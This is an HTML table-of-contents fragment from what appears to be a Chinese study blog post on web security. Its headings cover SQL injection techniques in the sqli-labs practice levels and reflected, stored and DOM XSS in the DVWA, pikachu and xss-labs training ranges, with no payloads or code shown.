href="#%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">在渗透测试过程中的作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E7%8E%B0%E4%BD%8D%E7%BD%AE"><span class="toc-text">出现位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BB%E6%89%BE%E6%96%B9%E5%BC%8F"><span class="toc-text">SQL注入漏洞寻找方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E4%BE%9D%E6%8D%AE"><span class="toc-text">SQL注入漏洞判断依据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81SQL%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5"><span class="toc-text">常见SQL测试语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E5%AD%97%E7%AC%A6"><span class="toc-text">注释字符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E8%BF%87%E7%A8%8B"><span class="toc-text">实操过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">sqli-labs手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%88Less-1%EF%BC%8C2%EF%BC%8C3%EF%BC%8C4%EF%BC%89"><span class="toc-text">SQL注入类型——联合查询（Less-1，2，3，4）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-1"><span class="toc-text">Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first"><span class="toc-text">first</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second"><span class="toc-text">second</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#third"><span class="toc-text">third</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#forth"><span class="toc-text">forth</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-2"><span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-3"><span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0"><span class="toc-text">sql注入练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88Less-5%EF%BC%8C6%EF%BC%89"><span class="toc-text">SQL注入类型——报错注入（Less-5，6）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-5"><span class="toc-text">Less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first-1"><span class="toc-text">first</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second-1"><span class="toc-text">second</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-Less-8"><span class="toc-text">SQL注入类型——布尔盲注(Less-8)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-8"><span class="toc-text">Less-8</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first-%E6%B1%82%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6"><span class="toc-text">first 求闭合字符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second-%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6length"><span class="toc-text">second 求数据库名长度length()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#third-%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%9A%84ascii%E5%80%BC-substr"><span class="toc-text">third 求数据库名的ascii值 substr</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#forth-%E6%B1%82%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8Fcount"><span class="toc-text">forth 求表的数量count()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fifth-%E6%B1%82%E8%A1%A8%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-text">fifth 求表的长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-Less-9"><span class="toc-text">SQL注入类型——时间盲注(Less-9)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-9"><span class="toc-text">Less-9</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first-2"><span class="toc-text">first</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second-2"><span class="toc-text">second</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2-Less-38"><span class="toc-text">SQL注入类型——堆叠查询(Less-38)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-38"><span class="toc-text">Less-38</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-Less-32"><span class="toc-text">SQL注入类型——宽字节注入(Less-32)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-32"><span class="toc-text">Less-32</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E6%B3%A8%E5%85%A5Less-11"><span class="toc-text">post注入Less-11</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3"><span class="toc-text">sqli-labs工具破解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89"><span class="toc-text">跨站脚本攻击（XSS）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-text">类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">反射型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA"><span class="toc-text">DVWA靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-text">存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">DVWA靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%B6%E7%94%B3"><span class="toc-text">延申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-text">DOM型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA"><span class="toc-text">pikachu靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">三种类型之间的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-labs-master%E9%9D%B6%E5%9C%BA"><span class="toc-text">xss-labs-master靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%94%A8htmlspecialchars-%E5%87%BD%E6%95%B0%E5%AF%B9keyword%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86"><span class="toc-text">服务器端用htmlspecialchars()函数对keyword参数的值进行处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level3"><span class="toc-text">level3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4"><span class="toc-text">level4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5"><span class="toc-text">level5</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89"><span class="toc-text">跨站脚本攻击（XSS）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-text">类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">反射型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA"><span class="toc-text">DVWA靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-text">存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">DVWA靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%B6%E7%94%B3"><span class="toc-text">延申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-text">DOM型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA"><span class="toc-text">pikachu靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">三种类型之间的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-labs-master%E9%9D%B6%E5%9C%BA"><span class="toc-text">xss-labs-master靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%94%A8htmlspecialchars-%E5%87%BD%E6%95%B0%E5%AF%B9keyword%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86"><span class="toc-text">服务器端用htmlspecialchars()函数对keyword参数的值进行处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level3"><span class="toc-text">level3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4"><span class="toc-text">level4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5"><span class="toc-text">level5</span></a></li></ol></li></ol></li></ol>
     </div>
   </div>
 
